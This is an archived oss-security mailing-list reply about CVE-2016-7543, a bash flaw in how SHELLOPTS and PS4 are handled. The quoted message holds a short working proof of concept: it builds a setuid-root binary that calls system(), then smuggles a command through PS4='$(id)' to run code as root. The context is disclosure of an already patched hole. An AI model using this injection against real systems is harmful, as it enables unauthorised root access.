X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["759" "Monday" "26" "September" "2016" "16:01:03" "-0700" "Tavis Ormandy" "taviso@cmpxchg8b.com" "<mpro.oe4vxq069usvx05jg.taviso@cmpxchg8b.com>" "24" "[oss-security] Re: CVE-2016-7543 -- bash SHELLOPTS+PS4" "^Date:" nil nil "9" "2016092623:01:03" "[oss-security] Re: CVE-2016-7543 -- bash SHELLOPTS+PS4" (number mark "U       taviso@cmpxc Sep 26   24/759   " thread-indent "\"[oss-security] Re: CVE-2016-7543 -- bash SHELLOPTS+PS4\"\n") "<20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>" ("<20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3091 invoked by uid 550); 27 Sep 2016 05:24:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 23573 invoked from network); 26 Sep 2016 23:01:46 -0000
X-Injected-Via-Gmane: http://gmane.org/
Message-ID: <mpro.oe4vxq069usvx05jg.taviso@cmpxchg8b.com>
References: <20160926174325.74454qfavcdb1uyo@webmail.alunos.dcc.fc.up.pt>
Content-Type: text/plain; charset=us-ascii
X-Complaints-To: usenet@blaine.gmane.org
User-Agent: Messenger-Pro/2.72.0.3902 (Qt/4.8.6) (Windows-8)
Date: Mon, 26 Sep 2016 16:01:03 -0700
From: Tavis Ormandy <taviso@cmpxchg8b.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: CVE-2016-7543 -- bash SHELLOPTS+PS4
To: oss-security@lists.openwall.com

up201407890@alunos.dcc.fc.up.pt wrote:

> The recent bash 4.4 patched an old attack vector regarding specially
> crafted SHELLOPTS+PS4 environment variables against bogus setuid binaries
> using system()/popen().
> 
> https://lists.gnu.org/archive/html/bug-bash/2016-09/msg00018.html
> 
> "nn. Shells running as root no longer inherit PS4 from the environment,
> closing a security hole involving PS4 expansion performing command
> substitution."
> 
> # gcc -xc - -otest <<< 'int main() { setuid(0); system("/bin/date"); }' #
> chmod 4755 ./test # ls -l ./test -rwsr-xr-x. 1 root root 8549 Sep 10 18:06
> ./test # exit $ env -i SHELLOPTS=xtrace PS4='$(id)' ./test uid=0(root) Sat
> Sep 10 18:06:36 WET 2016
> 
> Sorry Tavis :P
> 

Hah, nice work :-)

Tavis.

